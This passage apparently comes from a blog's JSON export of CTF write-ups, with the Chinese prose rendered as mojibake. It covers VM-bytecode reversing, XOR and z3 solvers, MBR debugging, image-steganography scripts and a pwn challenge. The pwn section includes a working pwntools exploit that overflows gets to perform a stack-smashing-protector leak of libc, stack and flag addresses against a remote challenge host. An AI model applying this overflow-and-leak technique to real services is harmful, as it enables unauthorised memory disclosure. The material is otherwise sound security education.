çš„ä¸€æ®µè™šæ‹ŸæœºæŒ‡ä»¤ã€‚åœ¨idaä¸­æ–°å»ºä¸€ä¸ªç»“æ„ï¼Œå°†å„ä¸ªåç§»çš„åå­—å¡«ä¸Šè™šè¡¨å‡½æ•°åï¼Œå°±å¯ä»¥åœ¨execute_vmä¸­çœ‹åˆ°opcodeæ‰€å¯¹åº”çš„å…·ä½“å‡½æ•°æ˜¯ä»€ä¹ˆäº†ã€‚é€šè¿‡åˆ†æè¿™äº›å‡½æ•°çš„æ“ä½œä¹Ÿå¾ˆå®¹æ˜“ç¡®å®šè™šæ‹Ÿæœºçš„ç»“æ„ï¼š 123456789101100000000 Vm 00000000 vtable dd ? 00000004 reg0 dd ?00000008 reg1 dd ?0000000C reg2 dd ?00000010 cnt dd ?00000014 flag dd ?00000018 maybe_mem dd ?0000001C field_1C dd ?00000020 stack dd ?00000024 ip_ptr dd ? äºæ˜¯å¯ä»¥å†™pythonè„šæœ¬å°†opcodeè¿˜åŸæˆæ˜“è¯»çš„ä¼ªæ±‡ç¼–è¯­è¨€çš„å½¢å¼ï¼š 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253code = [79, 0, 0, 0, 47, 85, 5, 84, 48, 70, 0, 71, 34, 72, 2, 75, 51, 73, 79, 0, 0, 0, 70, 84, 16, 72, 1, 77, 39, 79, 0, 0, 0, 48, 84, 16, 72, 1, 68, 22, 79, 0, 0, 0, 57, 84, 16, 72, 1, 68, 11, 79, 0, 0, 0, 65, 84, 1, 72, 1, 68, 6, 71, 0, 72, 0, 75, 5, 71, 0, 80, 0, 67, 85, 64, 79, 0, 0, 0, 7, 84, 48, 71, 17, 86, 70, 0, 79, 0, 0, 0, 48, 84, 32, 89, 2, 79, 0, 0, 0, 10, 84, 32, 72, 2, 68, 9, 79, 0, 0, 0, 7, 84, 32, 89, 2, 79, 0, 0, 0, 16, 84, 32, 88, 18, 83, 16, 85, 43, 79, 51, 180, 136, 172, 84, 32, 72, 18, 71, 0, 75, 3, 80, 0, 67, 79, 0, 0, 0, 7, 84, 48, 71, 17, 86, 70, 0, 79, 0, 0, 0, 48, 84, 32, 89, 2, 79, 0, 0, 0, 10, 84, 32, 72, 2, 68, 9, 79, 0, 0, 0, 7, 84, 32, 89, 2, 79, 0, 0, 0, 16, 84, 32, 88, 18, 83, 16, 85, 43, 79, 74, 11, 148, 63, 84, 32, 72, 18, 71, 0, 75, 3, 80, 0, 67, 79, 0, 0, 0, 7, 84, 48, 71, 17, 86, 70, 0, 79, 0, 0, 0, 48, 84, 32, 89, 2, 79, 0, 0, 0, 10, 84, 32, 72, 2, 68, 9, 79, 0, 0, 0, 7, 84, 32, 89, 2, 79, 0, 0, 0, 16, 84, 32, 88, 18, 83, 16, 85, 43, 79, 124, 92, 220, 236, 84, 32, 72, 18, 71, 0, 75, 3, 80, 0, 67, 79, 0, 0, 0, 7, 84, 48, 71, 17, 86, 70, 0, 79, 0, 0, 0, 48, 84, 32, 89, 2, 79, 0, 0, 0, 10, 84, 32, 72, 2, 68, 9, 79, 0, 0, 0, 7, 84, 32, 89, 2, 79, 0, 0, 0, 16, 84, 32, 88, 18, 83, 16, 85, 43, 79, 57, 41, 117, 27, 84, 32, 72, 18, 71, 0, 75, 3, 80, 0, 67, 79, 0, 0, 0, 7, 84, 48, 71, 17, 86, 70, 0, 79, 0, 0, 0, 48, 84, 32, 89, 2, 79, 0, 0, 0, 10, 84, 32, 72, 2, 68, 9, 79, 0, 0, 0, 7, 84, 32, 89, 2, 79, 0, 0, 0, 16, 84, 32, 88, 18, 83, 16, 85, 43, 79, 30, 242, 107, 45, 84, 32, 72, 18, 71, 0, 75, 3, 80, 0, 67, 79, 0, 0, 0, 7, 84, 48, 71, 17, 86, 70, 0, 79, 0, 0, 0, 48, 84, 32, 89, 2, 79, 0, 0, 0, 10, 84, 32, 72, 2, 68, 9, 79, 0, 0, 0, 7, 84, 32, 89, 2, 79, 0, 0, 0, 16, 84, 32, 88, 18, 83, 16, 85, 43, 79, 131, 141, 181, 46, 84, 32, 72, 18, 71, 0, 75, 2, 80, 0, 67]opcodes = &#123; 67: (\"return result\", 1), 68: (\"j_flag_neg1\", 2), 69: (\"mod_to_hi\", 2), 70: (\"load_to_hi\", 2), 71: (\"xor_to_hi\", 2), 72: (\"cmp_hi_to_lo\", 2), 73: (\"inc_mem_ptr\", 1), 74: (\"and_to_hi\", 2), 75: (\"j_not_flag\", 2), 76: (\"xor_block\", 16), 77: (\"j_flag_1\", 2), 78: (\"dec_assign_hi\", 2), 79: (\"push\", 5), 80: (\"inc_assign_hi\", 2), 81: (\"assign_lo_to_hi\", 2), 82: (\"push hi\", 2), 83: (\"add_to_hi\", 2), 84: (\"pop hi\", 2), 85: (\"jmp_bck_cnt\", 2), 86: (\"dec_mem_ptr\", 1), 87: (\"store hi\", 2), 88: (\"mul_to_hi\", 2), 89: (\"subs_to_hi\", 2)&#125;pc = 0while pc != len(code): opcode = code[pc] name = opcodes[opcode][0] length = opcodes[opcode][1] print \"%03x\\t\" % pc, print name, if length == 1: print pc += 1 elif length == 2: if 'hi' in name: print code[pc+1] &gt;&gt; 4, code[pc+1] &amp; 0xf else: print hex(code[pc+1]) pc += 2 elif length == 5: num = (code[pc+1] &lt;&lt; 24) | (code[pc+2] &lt;&lt; 16) | (code[pc+3] &lt;&lt; 8) | (code[pc+4] &lt;&lt; 0) print hex(num) pc += 5 elif length == 16: print for i in range(15): code[i + pc + 1] ^= 0x66 pc += 16 è¿è¡Œå¾—åˆ°å¦‚ä¸‹è¾“å‡ºï¼ˆè¾“å‡ºä¸­æ³¨é‡Šæ˜¯åˆ†æè¿‡ç¨‹ï¼‰ï¼š 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200000 push 0x2f005 jmp_bck_cnt 0x5007 pop hi 3 0009 load_to_hi 0 000b xor_to_hi 2 200d cmp_hi_to_lo 0 200f j_not_flag 0x33 =&gt; 0x44011 inc_mem_ptr012 push 0x46017 pop hi 1 0019 cmp_hi_to_lo 0 101b j_flag_1 0x27 =&gt; 0x4401d push 0x30022 pop hi 1 0024 cmp_hi_to_lo 0 1026 j_flag_neg1 0x16 =&gt; 0x3e028 push 0x3902d pop hi 1 002f cmp_hi_to_lo 0 1031 j_flag_neg1 0xb =&gt; 0x3e033 push 0x41038 pop hi 0 103a cmp_hi_to_lo 0 103c j_flag_neg1 0x6 =&gt; 0x4403e xor_to_hi 0 0040 cmp_hi_to_lo 0 0042 j_not_flag 0x5 =&gt; 0x49fail:044 xor_to_hi 0 0046 inc_assign_hi 0 0048 return result049 jmp_bck_cnt 0x40(check hex digits)04b push 0x7 050 pop hi 3 0 // cnt = 0x7052 xor_to_hi 1 1 // reg[1] = 0back:054 dec_mem_ptr055 load_to_hi 0 0 // reg[0] = c057 push 0x3005c pop hi 2 0 // reg[2] = 0x3005e subs_to_hi 0 2 // c-=0x30060 push 0xa065 pop hi 2 0 // reg[2] = 10067 cmp_hi_to_lo 0 2069 j_flag_neg1 0x9 // c &lt; 10 =&gt; less_than_1006b push 0x7070 pop hi 2 0 // reg[2] = 7072 subs_to_hi 0 2 // c-=7less_than_10:074 push 0x10079 pop hi 2 007b mul_to_hi 1 2 i &lt;&lt; 407d add_to_hi 1 0 i += c07f jmp_bck_cnt 0x2b =&gt; back081 push 0x33b488ac086 pop hi 2 0088 cmp_hi_to_lo 1 208a xor_to_hi 0 008c j_not_flag 0x308e inc_assign_hi 0 0090 return result(åä¸ƒä¸ªå­—ç¬¦ä¸º &quot;33b488ac&quot;[::-1])091 push 0x7096 pop hi 3 0098 xor_to_hi 1 109a dec_mem_ptr09b load_to_hi 0 009d push 0x300a2 pop hi 2 00a4 subs_to_hi 0 20a6 push 0xa0ab pop hi 2 00ad cmp_hi_to_lo 0 20af j_flag_neg1 0x90b1 push 0x70b6 pop hi 2 00b8 subs_to_hi 0 20ba push 0x100bf pop hi 2 00c1 mul_to_hi 1 20c3 add_to_hi 1 00c5 jmp_bck_cnt 0x2b0c7 push 0x4a0b943f0cc pop hi 2 00ce cmp_hi_to_lo 1 20d0 xor_to_hi 0 00d2 j_not_flag 0x30d4 inc_assign_hi 0 00d6 return result0d7 push 0x70dc pop hi 3 00de xor_to_hi 1 10e0 dec_mem_ptr0e1 load_to_hi 0 00e3 push 0x300e8 pop hi 2 00ea subs_to_hi 0 20ec push 0xa0f1 pop hi 2 00f3 cmp_hi_to_lo 0 20f5 j_flag_neg1 0x90f7 push 0x70fc pop hi 2 00fe subs_to_hi 0 2100 push 0x10105 pop hi 2 0107 mul_to_hi 1 2109 add_to_hi 1 010b jmp_bck_cnt 0x2b10d push 0x7c5cdcec112 pop hi 2 0114 cmp_hi_to_lo 1 2116 xor_to_hi 0 0118 j_not_flag 0x311a inc_assign_hi 0 011c return result11d push 0x7122 pop hi 3 0124 xor_to_hi 1 1126 dec_mem_ptr127 load_to_hi 0 0129 push 0x3012e pop hi 2 0130 subs_to_hi 0 2132 push 0xa137 pop hi 2 0139 cmp_hi_to_lo 0 213b j_flag_neg1 0x913d push 0x7142 pop hi 2 0144 subs_to_hi 0 2146 push 0x1014b pop hi 2 014d mul_to_hi 1 214f add_to_hi 1 0151 jmp_bck_cnt 0x2b153 push 0x3929751b158 pop hi 2 015a cmp_hi_to_lo 1 215c xor_to_hi 0 015e j_not_flag 0x3160 inc_assign_hi 0 0162 return result163 push 0x7168 pop hi 3 016a xor_to_hi 1 116c dec_mem_ptr16d load_to_hi 0 016f push 0x30174 pop hi 2 0176 subs_to_hi 0 2178 push 0xa17d pop hi 2 017f cmp_hi_to_lo 0 2181 j_flag_neg1 0x9183 push 0x7188 pop hi 2 018a subs_to_hi 0 218c push 0x10191 pop hi 2 0193 mul_to_hi 1 2195 add_to_hi 1 0197 jmp_bck_cnt 0x2b199 push 0x1ef26b2d19e pop hi 2 01a0 cmp_hi_to_lo 1 21a2 xor_to_hi 0 01a4 j_not_flag 0x31a6 inc_assign_hi 0 01a8 return result1a9 push 0x71ae pop hi 3 01b0 xor_to_hi 1 11b2 dec_mem_ptr1b3 load_to_hi 0 01b5 push 0x301ba pop hi 2 01bc subs_to_hi 0 21be push 0xa1c3 pop hi 2 01c5 cmp_hi_to_lo 0 21c7 j_flag_neg1 0x91c9 push 0x71ce pop hi 2 01d0 subs_to_hi 0 21d2 push 0x101d7 pop hi 2 01d9 mul_to_hi 1 21db add_to_hi 1 01dd jmp_bck_cnt 0x2b1df push 0x838db52e1e4 pop hi 2 01e6 cmp_hi_to_lo 1 21e8 xor_to_hi 0 01ea j_not_flag 0x21ec inc_assign_hi 0 01ee return result åˆ†æåˆ°090è§‚å¯Ÿåˆ°ä¸‹é¢éƒ½æ˜¯ç±»ä¼¼çš„ä»£ç ç»“æ„ï¼Œä¹‹åç›´æ¥è¿˜åŸflagå°±å¯ä»¥äº†ï¼Œåªéœ€è¦æŠŠæ¯”è¾ƒçš„åå…­è¿›åˆ¶å­—ç¬¦ä¸²æŒ‰ç«¯åºä»åå¾€å‰æ‹¼æ¥èµ·æ¥å¾—åˆ°flagã€‚ å‚è€ƒç½‘ç«™https://laucyun.com/3411bc6f400207178b85defa04474b4a.htmlhttps://spaces.ac.cn/archives/1907https://math.stackexchange.com/questions/1791562/converting-0-1-to-binary-64-bit-doublehttps://xz.aliyun.com/t/2897https://blog.csdn.net/qq_33438733/article/details/83044151","categories":[],"tags":[{"name":"ctf","slug":"ctf","permalink":"https://qianfei11.github.io/tags/ctf/"},{"name":"review","slug":"review","permalink":"https://qianfei11.github.io/tags/review/"}]},{"title":"2018-ç½‘é¼æ¯-review","slug":"2018-ç½‘é¼æ¯-review","date":"2018-09-12T13:00:45.000Z","updated":"2019-02-18T13:16:15.272Z","comments":true,"path":"2018/09/12/2018-ç½‘é¼æ¯-review/","link":"","permalink":"https://qianfei11.github.io/2018/09/12/2018-ç½‘é¼æ¯-review/","excerpt":"ç°é˜¶æ®µä¸»è¦ä¸€ç›´åœ¨åšé€†å‘ï¼Œçœ‹äº†å¥½å‡ é“é€†å‘çš„wpå¤ç°ä¸€ä¸‹ã€‚","text":"ç°é˜¶æ®µä¸»è¦ä¸€ç›´åœ¨åšé€†å‘ï¼Œçœ‹äº†å¥½å‡ é“é€†å‘çš„wpå¤ç°ä¸€ä¸‹ã€‚ REbeijingç®€å•çš„å¼‚æˆ–ï¼Œç›´æ¥å–åŸæ¥çš„æ•°æ®ï¼š 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364#include &lt;stdio.h&gt;unsigned char pair[28] = &#123; 0x61, 0x4C, 0x67, 0x59, 0x69, 0x29, 0x6E, 0x42, 0x62, 0x0D, 0x65, 0x71, 0x66, 0x34, 0x6A, 0xC6, 0x6D, 0x8A, 0x6C, 0x7F, 0x7B, 0xAE, 0x7A, 0x92, 0x7D, 0xEC, 0x5F, 0x57&#125;;unsigned int choice[22] = &#123; 0x6, 0x9, 0x0, 0x1, 0xA, 0x0, 0x8, 0x0, 0xB, 0x2, 0x3, 0x1, 0xD, 0x4, 0x5, 0x2, 0x7, 0x2, 0x3, 0x1, 0xC&#125;;int main() &#123; char tmp = 0; for(int i = 0; i &lt; 22; i++) &#123; switch(choice[i]) &#123; case 0: tmp = pair[2 * choice[i]]; break; case 1: tmp = pair[2 * choice[i]]; break; case 2: tmp = pair[2 * choice[i]]; break; case 3: tmp = pair[2 * choice[i]]; break; case 4: tmp = pair[2 * choice[i]]; break; case 5: tmp = pair[2 * choice[i]]; break; case 6: tmp = pair[2 * choice[i]]; break; case 7: tmp = pair[2 * choice[i]]; break; case 8: tmp = pair[2 * choice[i]]; break; case 9: tmp = pair[2 * choice[i]]; break; case 10: tmp = pair[2 * choice[i]]; break; case 11: tmp = pair[2 * choice[i]]; break; case 12: tmp = pair[2 * choice[i]]; break; case 13: tmp = pair[2 * choice[i]]; break; default: tmp = 0; break; &#125; printf(\"%c\", tmp); fflush(stdout); &#125; return 0;&#125; advancedéé¢„æœŸè§£ï¼Œå¯¹åŠ å¯†äº†çš„å­—ç¬¦ä¸²å°è¯•å¼‚æˆ–å°±æ‰¾åˆ°äº†è§„å¾‹ï¼š 12345678enc = 'K@LKVHr[DXEsLsYI@\\\\AMYIr\\\\EIZQ'flag = ''for i in range(len(enc)): if i &amp; 1: flag += chr(ord(enc[i]) ^ 0x2C) else: flag += chr(ord(enc[i]) ^ 0x2D)print flag blendå’Œä¹‹å‰çš„ä¸€é“é¢˜åŸºæœ¬ä¸€æ ·ã€‚fileä¸€ä¸‹æ˜¯MBR\bï¼Œå¯ä»¥ç”¨qemuè·‘ä¸€ä¸‹ã€‚ 1qemu-system-i386 -s -drive format=raw,file=./main.bin é€šè¿‡gdbè¿œç¨‹è¿æ¥qemuè¿›è¡ŒåŠ¨æ€è°ƒè¯•ï¼š 123456789101112131415161718192021222324252627282930[Desktop] gdb 23:42:46 GNU gdb (Ubuntu 7.11.1-0ubuntu1~16.5) 7.11.1Copyright (C) 2016 Free Software Foundation, Inc.License GPLv3+: GNU GPL version 3 or later &lt;http://gnu.org/licenses/gpl.html&gt;This is free software: you are free to change and redistribute it.There is NO WARRANTY, to the extent permitted by law. Type &quot;show copying&quot;and &quot;show warranty&quot; for details.This GDB was configured as &quot;x86_64-linux-gnu&quot;.Type &quot;show configuration&quot; for configuration details.For bug reporting instructions, please see:&lt;http://www.gnu.org/software/gdb/bugs/&gt;.Find the GDB manual and other documentation resources online at:&lt;http://www.gnu.org/software/gdb/documentation/&gt;.For help, type &quot;help&quot;.Type &quot;apropos word&quot; to search for commands related to &quot;word&quot;.GEF for linux ready, type `gef&apos; to start, `gef config&apos; to configure65 commands loaded for GDB 7.11.1 using Python engine 3.5[*] 5 commands could not be loaded, run `gef missing` to know why.gefâ¤ set architecture i8086warning: A handler for the OS ABI &quot;GNU/Linux&quot; is not built into this configurationof GDB. Attempting to continue with the default i8086 settings.The target architecture is assumed to be i8086gefâ¤ set disassembly-flavor intelgefâ¤ target remote:1234Remote debugging using :12340x0000c073 in ?? ()[ Legend: Modified register | Code | Heap | Stack | String ]â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€[ registers ]â”€â”€â”€â”€[!] Command &apos;context&apos; failed to execute properly, reason: &apos;NoneType&apos; object has no attribute &apos;all_registers&apos; æˆ–è€…åœ¨idaä¸­é™æ€åˆ†æï¼Œä¸»è¦è¦äº†è§£ä¸€ä¸‹sseæŒ‡ä»¤ï¼š æŒ‡ä»¤ ä½œç”¨ MOVAPS æŠŠæºå­˜å‚¨å™¨å†…å®¹å€¼é€å…¥ç›®çš„å¯„å­˜å™¨ã€‚å½“æœ‰m128æ—¶, å†…å­˜åœ°å€å¿…é¡»æ˜¯16å­—èŠ‚å¯¹é½çš„ã€‚ PSHUFD æœ‰ä¸‰ä¸ªæ“ä½œæ•°ï¼Œä»å·¦å¾€å³ï¼Œç¬¬ä¸€ä¸ªæ“ä½œæ•°æ˜¯ç›®çš„æ“ä½œæ•°ä¿å­˜ç»“æœï¼Œç¬¬äºŒä¸ªæ“ä½œæ•°æ˜¯æºæ“ä½œæ•°ï¼Œç¬¬ä¸‰ä¸ªæ“ä½œæ•°æ˜¯ä¸€ä¸ª8ä½ç«‹å³æ•°ï¼ŒæŒ‡å®šä»¥æ€æ ·çš„é¡ºåºå°†æºæ“ä½œæ•°ä¸­æ•°æ®ä¿å­˜åˆ°ç›®çš„æ“ä½œæ•°ã€‚ ANDPS æŒ‰ä½ä¸ PSADBW ç»å¯¹å·®å€¼æ±‚å’Œ å…ˆæ˜¯åˆ¤æ–­å­—ç¬¦ä¸²é•¿åº¦æ˜¯å¦å¤§äº19ï¼š ç„¶ååœ¨å¾ªç¯ä¸­é€ä¸ªæ¯”è¾ƒï¼š åœ¨å¾ªç¯ä¸­ï¼Œä¸»è¦æ˜¯pshufdæŒ‡ä»¤çš„æ“ä½œï¼š 123456780xffffffffffffff00 0xffffffffffffff000xffffffffffff00ff 0xffffffffffff00ff0xffffffffff00ffff 0xffffffffff00ffff0xffffffff00ffffff 0xffffffff00ffffff0xffffff00ffffffff 0xffffff00ffffffff0xffff00ffffffffff 0xffff00ffffffffff0xff00ffffffffffff 0xff00ffffffffffff0x00ffffffffffffff 0x00ffffffffffffff ç„¶åä¸å†…å­˜ä¸­çš„æ•°æ®ç›¸ä¸ï¼Œå†é€šè¿‡psadbwæŒ‡ä»¤è¿›è¡Œç»å¯¹å·®æ±‚å’Œã€‚ è¿˜æœ‰å¯¹é«˜ä½ä½çš„ä¸€ä¸ªä½ç½®äº¤æ¢ï¼š 123seg000:009F mov di, ds:1268hseg000:00A3 shl edi, 10hseg000:00A7 mov di, ds:1270h æœ€åç”¨z3çº¦æŸæ±‚è§£ï¼š 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677from z3 import *s = Solver()a = Int('a') b = Int('b') c = Int('c') d = Int('d') e = Int('e') f = Int('f') g = Int('g') h = Int('h') i = Int('i') j = Int('j') k = Int('k') l = Int('l') m = Int('m') n = Int('n') o = Int('o') p = Int('p')s.add(a &lt; 127)s.add(b &lt; 127)s.add(c &lt; 127)s.add(d &lt; 127)s.add(e &lt; 127)s.add(f &lt; 127)s.add(g &lt; 127)s.add(h &lt; 127)s.add(i &lt; 127)s.add(j &lt; 127)s.add(k &lt; 127)s.add(l &lt; 127)s.add(m &lt; 127)s.add(n &lt; 127)s.add(o &lt; 127)s.add(p &lt; 127)s.add(a &gt; 32)s.add(b &gt; 32)s.add(c &gt; 32)s.add(d &gt; 32)s.add(e &gt; 32)s.add(f &gt; 32)s.add(g &gt; 32)s.add(h &gt; 32)s.add(i &gt; 32)s.add(j &gt; 32)s.add(k &gt; 32)s.add(l &gt; 32)s.add(m &gt; 32)s.add(n &gt; 32)s.add(o &gt; 32)s.add(p &gt; 32)s.add(abs(d-0x22)+abs(c-0xf)+abs(b-0x2)+abs(a-0xc8)+abs(h-0x83)+abs(g-0xfb)+abs(f-0xe0)+abs(0-0x83)==0x304)s.add(abs(p-0xc0)+abs(o-0x20)+abs(n-0xf)+abs(m-0x10)+abs(l-0xcd)+abs(k-0x00)+abs(j-0x13)+abs(0-0xb8)==0x311)s.add(abs(d-0x0)+abs(c-0x0)+abs(b-0x0)+abs(a-0x0)+abs(h-0x0)+abs(g-0x0)+abs(0-0x3)+abs(e-0x4)==0x2cd)s.add(abs(p-0x0)+abs(o-0x0)+abs(n-0x00)+abs(m-0x0)+abs(l-0x0)+abs(k-0x00)+abs(0-0x3)+abs(i-0x11)==0x2d9)s.add(abs(d-0x0)+abs(c-0x0)+abs(b-0x0)+abs(a-0x0)+abs(h-0x0)+abs(0-0x0)+abs(f-0x2)+abs(e-0xcd)==0x2db)s.add(abs(p-0x0)+abs(o-0x0)+abs(n-0x0)+abs(m-0x0)+abs(l-0x0)+abs(0-0x00)+abs(j-0x2)+abs(i-0xd9)==0x2d4)s.add(abs(d-0x0)+abs(c-0x0)+abs(b-0x0)+abs(a-0x0)+abs(0-0x0)+abs(g-0x0)+abs(f-0x2)+abs(e-0xdb)==0x2e2)s.add(abs(p-0x0)+abs(o-0x0)+abs(n-0x0)+abs(m-0x0)+abs(0-0x0)+abs(k-0x00)+abs(j-0x2)+abs(i-0xd4)==0x2c4)s.add(abs(d-0x0)+abs(c-0x0)+abs(b-0x0)+abs(0-0x0)+abs(h-0x0)+abs(g-0x0)+abs(f-0x2)+abs(e-0xe2)==0x2e2)s.add(abs(p-0x0)+abs(o-0x0)+abs(n-0x0)+abs(0-0x0)+abs(l-0x0)+abs(k-0x00)+abs(j-0x2)+abs(i-0xc4)==0x2ce)s.add(abs(d-0x0)+abs(c-0x0)+abs(0-0x0)+abs(a-0x0)+abs(h-0x0)+abs(g-0x0)+abs(f-0x2)+abs(e-0xe2)==0x2ed)s.add(abs(p-0x0)+abs(o-0x0)+abs(0-0x0)+abs(m-0x0)+abs(l-0x0)+abs(k-0x00)+abs(j-0x2)+abs(i-0xce)==0x2d8)s.add(abs(d-0x0)+abs(0-0x0)+abs(b-0x0)+abs(a-0x0)+abs(h-0x0)+abs(g-0x0)+abs(f-0x2)+abs(e-0xed)==0x2e8)s.add(abs(p-0x0)+abs(0-0x0)+abs(n-0x0)+abs(m-0x0)+abs(l-0x0)+abs(k-0x00)+abs(j-0x2)+abs(i-0xd8)==0x2dc)s.add(abs(0-0x0)+abs(c-0x0)+abs(b-0x0)+abs(a-0x0)+abs(h-0x0)+abs(g-0x0)+abs(f-0x2)+abs(e-0xe8)==0x2f6)s.add(abs(0-0x0)+abs(o-0x0)+abs(n-0x0)+abs(m-0x0)+abs(l-0x0)+abs(k-0x00)+abs(j-0x2)+abs(i-0xdc)==0x2dd)print s.check()model = s.model()ans = [model[a],model[b],model[c],model[d],model[e],model[f],model[g],model[h], model[i],model[j],model[k],model[l],model[m],model[n],model[o],model[p],0]print ansflag = ''.join([chr(int(str(x))) for x in ans])print flag PWNGUESSæ¼æ´ç‚¹å¾ˆæ˜æ˜¾ï¼Œgetså¤„å¯ä»¥æº¢å‡ºï¼š 123456789101112131415161718192021222324252627282930313233343536373839404142434445__int64 __fastcall main(__int64 a1, char **a2, char **a3)&#123; __WAIT_STATUS stat_loc; // [rsp+14h] [rbp-8Ch] int v5; // [rsp+1Ch] [rbp-84h] __int64 v6; // [rsp+20h] [rbp-80h] __int64 v7; // [rsp+28h] [rbp-78h] char buf; // [rsp+30h] [rbp-70h] char s2; // [rsp+60h] [rbp-40h] unsigned __int64 v10; // [rsp+98h] [rbp-8h] v10 = __readfsqword(0x28u); v7 = 3LL; LODWORD(stat_loc.__uptr) = 0; v6 = 0LL; sub_4009A6(); HIDWORD(stat_loc.__iptr) = open(\"./flag.txt\", 0, a2); if ( HIDWORD(stat_loc.__iptr) == -1 ) &#123; perror(\"./flag.txt\"); _exit(-1); &#125; read(SHIDWORD(stat_loc.__iptr), &amp;buf, 0x30uLL); close(SHIDWORD(stat_loc.__iptr)); puts(\"This is GUESS FLAG CHALLENGE!\"); while ( 1 ) &#123; if ( v6 &gt;= v7 ) &#123; puts(\"you have no sense... bye :-) \"); return 0LL; &#125; v5 = sub_400A11(); // fork() if ( !v5 ) break; ++v6; wait((__WAIT_STATUS)&amp;stat_loc); &#125; puts(\"Please type your guessing flag\"); gets((__int64)&amp;s2); if ( !strcmp(&amp;buf, &amp;s2) ) puts(\"You must have great six sense!!!! :-o \"); else puts(\"You should take more effort to get six sence, and one more challenge!!\"); return 0LL;&#125; checksecåå‘ç°å¼€äº†Canaryã€‚Canaryæ£€æŸ¥å¤±è´¥çš„æ—¶å€™è°ƒç”¨__stack_chk_failï¼š 12345void __attribute__ ((noreturn)) __stack_chk_fail (void) &#123; __fortify_fail (\"stack smashing detected\"); &#125; å…¶ä¸­çš„__fortify_failæ‰“å°å‡ºäº†__libc_argv[0]æ‰€æŒ‡å‘å­—ç¬¦ä¸²ï¼š 123456789void __attribute__ ((noreturn)) __fortify_fail (msg) const char *msg; &#123; /* The loop is added only to keep gcc happy. */ while (1) __libc_message (2, \"*** %s ***: %s terminated\\n\", msg, __libc_argv[0] ?: \"&lt;unknown&gt;\") &#125; libc_hidden_def (__fortify_fail) å¯ä»¥é€šè¿‡è¦†ç›–__libc_argv[0]å®ç°è¯»å–æƒ³è¦çš„æ•°æ®ï¼Œä¹Ÿå°±æ˜¯SSPï¼ˆStack Smashing Protectorï¼‰ Leakã€‚è°ƒè¯•è¿‡ç¨‹ä¸­æœ‰ä¸€ä¸ªæ¯”è¾ƒå®¹æ˜“è·å–æŒ‡é’ˆçš„æ–¹æ³•ï¼š 12assassinq&gt;&gt; p &amp;__libc_argv[0]$1 = (char **) 0x7fffffffe4c8 ç„¶åå› ä¸ºlibcå¯¼å‡ºäº†ä¸€ä¸ªç¬¦å·environï¼Œå…¶å€¼å’Œmainå‡½æ•°çš„ç¬¬ä¸‰ä¸ªå‚æ•°envpä¸€æ ·ã€‚è¿™æ ·çš„è¯ï¼Œåªè¦æ³„æ¼å‡ºlibcçš„åŸºå€å°±å¯ä»¥å¾—åˆ°æ ˆä¸Šçš„åœ°å€ã€‚ ä¸‰æ¬¡è¿›ç¨‹æ­£å¥½åˆ†ä¸ºï¼š åˆ©ç”¨gotè¡¨å¾—åˆ°libcåœ°å€ åˆ©ç”¨libcçš„environå¾—åˆ°stackåœ°å€ è®¡ç®—flagåœ°å€å¹¶è¾“å‡º expï¼š 12345678910111213141516171819202122232425262728293031323334353637383940#!/usr/bin/env pythonfrom pwn import *context.log_level = 'debug'local = 1if local: p = process('./guess')else: p = remote('106.75.90.160', 9999)elf = ELF('./guess')libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')buf = 0x7fffffffe4d0argv_0 = 0x7fffffffe5f8offset1 = argv_0 - getsoffset2 = 0x7ffd12119a88 - 0x7ffd12119920gets_got = elf.got['gets'] # 0x602058# got ==&gt; libcp.recvuntil('flag\\n')payload = 'A' * offset1 + p64(gets_got)p.sendline(payload)p.recvuntil('***: ')gets_got = u64(sh.recv(6).ljust(8, '\\x00'))print hex(gets_got)libc_base = gets_got - libc.symbols['gets']libc.address = libc_baseprint hex(libc_base)# libc ==&gt; environ ==&gt; stackp.recvuntil('flag\\n')payload = 'A' * offset1 + p64(libc.symbols['environ'])p.sendline(payload)p.recvuntil('***: ')stack = u64(p.recv(6).ljust(8, '\\x00'))print hex(stack)# flagp.recvuntil('flag\\n')payload = 'B' * offset1 + p64(stack - offset2)p.sendline(payload)p.interactive() MISCminifiedå–å‡ºAlpha0å’ŒGreen0é€šé“çš„å›¾ç‰‡åå¼‚æˆ–å¾—åˆ°flagã€‚ åŒè‰²å—å…ˆä¸Šbinwalkå¾—åˆ°å›¾ç‰‡ï¼Œkeyä¸ºctfer2333ã€‚ å°è¯•æŠŠgifæ¯ä¸€ä¸ªå¸§æ‹¼å‡‘æˆå›¾ç‰‡ï¼Œå‘ç°æ— æ³•å¾—åˆ°ä¸€ä¸ªæ­£å¸¸çš„äºŒç»´ç ã€‚ å†çŒœæµ‹å°†ç´«è‰²ä¸ç»¿è‰²è‰²å—åˆ†åˆ«è¡¨ç¤º\b1å’Œ0ï¼Œå…ˆæå–å‡ºæ¯å¼ å›¾ç‰‡ï¼š 123456789101112131415161718import osfrom PIL import Imagedef main(gif_file): png_dir = 'frame/' img = Image.open(gif_file) try: while True: current = img.tell() print current img.save(png_dir + str(current + 1) + '.png') img.seek(current + 1) except BaseException as e: print eif __name__ == '__main__': gif_file = 'out.gif' main(gif_file) å†è¯»å–å›¾ç‰‡å†…å®¹ï¼Œè½¬æ¢æˆ0å’Œ1ï¼Œæœ€åæ¯8ä½è½¬ä¸ºä¸€ä¸ªasciiå­—ç¬¦ï¼š 123456789101112131415161718192021222324252627import osfrom PIL import Imagedef main(): png_dir = 'frame/' ret = '' for i in range(0, 24): line = '' for j in range(0, 24): file_name = 'frame/' + str(i * 24 + j + 1) + '.png' x = j * 10 + 5 y = i * 10 + 5 img = Image.open(file_name) img = img.convert('RGB') img_array = img.load() r, g, b = p = img_array[x, y] if g == 255: line += '0' if r == 255 and b == 255: line += '1' if len(line) == 8: ret += 